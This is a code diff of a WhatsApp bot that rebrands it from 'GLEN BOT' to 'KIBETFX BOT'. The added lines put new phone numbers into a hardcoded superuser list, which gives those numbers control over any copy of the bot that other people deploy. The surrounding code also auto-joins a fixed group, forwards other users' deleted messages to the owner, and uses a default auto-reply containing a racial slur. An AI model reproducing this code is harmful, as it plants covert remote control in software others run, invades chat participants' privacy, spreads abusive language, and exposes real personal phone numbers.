@@ -132,7 +132,7 @@ function getCurrentDateTime() {
 setInterval(async () => {
     if (conf.AUTO_BIO === "yes") {
         const currentDateTime = getCurrentDateTime(); // Get the current date and time
-        const bioText = `🩸I AM GLEN BOT : ${currentDateTime}`; // Format the bio text
+        const bioText = `🩸I AM KIBETFX BOT : ${currentDateTime}`; // Format the bio text
         await zk.updateProfileStatus(bioText); // Update the bio
         console.log(`Updated Bio: ${bioText}`); // Log the updated bio
     }
@@ -147,13 +147,13 @@ setInterval(async () => {
 
     await zk.rejectCall(callId, callerId);
     await zk.sendMessage(callerId, {
-      text: "*🩸𝙼𝚈 𝙾𝚆𝙽𝙴𝚁 𝙳𝙾𝙴𝚂𝙽𝚃 𝙰𝙻𝙻𝙾𝚆 𝙲𝙰𝙻𝙻𝚂 𝚂𝙾 𝚂𝚃𝙾𝙿 𝙲𝙰𝙻𝙻𝙸𝙽𝙶 𝙾𝚁 𝙸 𝚆𝙸𝙻𝙻 𝙱𝙻𝙾𝙲𝙺 𝚈𝙾𝚄  .*\n\n> I AM GLEN BOT MADE BY GLEN ."
+      text: "*🩸𝙼𝚈 𝙾𝚆𝙽𝙴𝚁 𝙳𝙾𝙴𝚂𝙽𝚃 𝙰𝙻𝙻𝙾𝚆 𝙲𝙰𝙻𝙻𝚂 𝚂𝙾 𝚂𝚃𝙾𝙿 𝙲𝙰𝙻𝙻𝙸𝙽𝙶 𝙾𝚁 𝙸 𝚆𝙸𝙻𝙻 𝙱𝙻𝙾𝙲𝙺 𝚈𝙾𝚄  .*\n\n> I AM KIBET-FX BOT MADE BY KIBET ."
     });
   }
 });
 
         // Default auto-reply message
-let auto_reply_message = "𝙷𝙴𝙻𝙻𝙾 𝙽𝙸𝙶𝙶𝙰 𝙼𝚈 𝙿𝙷𝙾𝙽𝙴 𝙸𝚂 𝙲𝙷𝙰𝚁𝙶𝙸𝙽𝙶 𝚂𝙾 𝙱𝙴 𝙿𝙰𝚃𝙸𝙴𝙽𝚃 𝙼𝚈 𝙾𝚆𝙽𝙴𝚁 𝚆𝙸𝙻𝙻 𝚃𝙴𝚇𝚃 𝚈𝙾𝚄.\n\n> 𝚃𝙷𝙸𝚂 𝙸𝚂 glen bot 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐛𝐲 𝐆𝐋𝐄𝐍 ..";
+let auto_reply_message = "𝙷𝙴𝙻𝙻𝙾 𝙽𝙸𝙶𝙶𝙰 𝙼𝚈 𝙿𝙷𝙾𝙽𝙴 𝙸𝚂 𝙲𝙷𝙰𝚁𝙶𝙸𝙽𝙶 𝚂𝙾 𝙱𝙴 𝙿𝙰𝚃𝙸𝙴𝙽𝚃 𝙼𝚈 𝙾𝚆𝙽𝙴𝚁 𝚆𝙸𝙻𝙻 𝚃𝙴𝚇𝚃 𝚈𝙾𝚄.\n\n> 𝚃𝙷𝙸𝚂 𝙸𝚂 kibetfx bot 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐛𝐲 KIBET ..";
 
 // Track contacts that have already received the auto-reply
 let repliedContacts = new Set();
@@ -220,7 +220,7 @@ function createNotification(deletedMessage) {
         timeStyle: 'medium',
     }).format(new Date());
 
-    let notification = `*[ 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐃𝐈𝐒𝐏𝐋𝐀𝐘𝐄𝐃 𝐁𝐘 🩸𝐆𝐋𝐄𝐍 𝐁𝐎𝐓🩸 ]*\n\n`;
+    let notification = `*[ 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐃𝐈𝐒𝐏𝐋𝐀𝐘𝐄𝐃 𝐁𝐘 🩸𝐊𝐈𝐁𝐄𝐓-𝐅𝐗 𝐁𝐎𝐓🩸 ]*\n\n`;
     notification += `*⌚Deletion Time:* ${timeInNairobi}\n`;
     notification += `*👤Deleted By:* @${deletedBy.split('@')[0]}\n\n`;
 
@@ -261,7 +261,7 @@ zk.ev.on("messages.upsert", async (m) => {
                     // Handle text messages (conversation or extendedTextMessage)
                     if (mtype === 'conversation' || mtype === 'extendedTextMessage') {
                         await zk.sendMessage(zk.user.id, {
-                            text: notification + `*Message:* ${deletedMessage.message[mtype].text}\n\n> 𝐈𝐌 🩸𝐆𝐋𝐄𝐍 𝐁𝐎𝐓🩸 developed by gen.`,
+                            text: notification + `*Message:* ${deletedMessage.message[mtype].text}\n\n> 𝐈𝐌 🩸𝐊𝐈𝐁𝐄𝐓-𝐅𝐗 𝐁𝐎𝐓🩸 developed by kibet.`,
                             mentions: [deletedMessage.key.participant],
                         });
                     }
@@ -487,11 +487,11 @@ if (conf.AUTO_REACT_STATUS === "yes") {
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
             const dj = '254104882369';
-            const dj2 = '254720254797';
-            const dj3 = "254720254797";
+            const dj2 = '254799963583';
+            const dj3 = "254799963583";
             const luffy = '254114142192';
             const sudo = await getAllSudoNumbers();
-            let goat = "254732297394";
+            let goat = "254799963583";
             const superUserNumbers = [servBot, goat, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
@@ -1350,7 +1350,7 @@ zk.ev.on('group-participants.update', async (group) => {
                 else {
                     md = "undefined";
                 }
-                console.log("glen bot successfully connected🩸");
+                console.log("KIBET-FX bot successfully connected🩸");
 
                 await activateCrons();
                 
@@ -1361,7 +1361,7 @@ zk.ev.on('group-participants.update', async (group) => {
  │ 🩸 ᴘʀᴇғɪx : [ ${prefixe} ]
  │ 🩸ᴍᴏᴅᴇ : ${md}
  │  🩸ᴘʟᴜɢɪɴs : 25000
- │  🩸updates : https://whatsapp.com/channel/0029Vb7pQWM8kyyIfIMbsQ10
+ │  🩸updates : https://chat.whatsapp.com/KnL0Ft6gvHDGP2lH3oN5Z5
  ╰───────────────🩸
 𝙴𝙽𝙹𝙾𝚈 𝙽𝙾𝚆` ;
 
@@ -1379,7 +1379,7 @@ await zk.groupAcceptInvite("F0x0O4o8reS15D6kVfAChW");
                     main();
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason.connectionLost) {
-                    console.log('connection error💔,,glen🩸trying to reconnect... ');
+                    console.log('connection error💔,,kibetfx🩸trying to reconnect... ');
                     main();
                 }
                 else if (raisonDeconnexion === baileys_1.DisconnectReason?.connectionReplaced) {
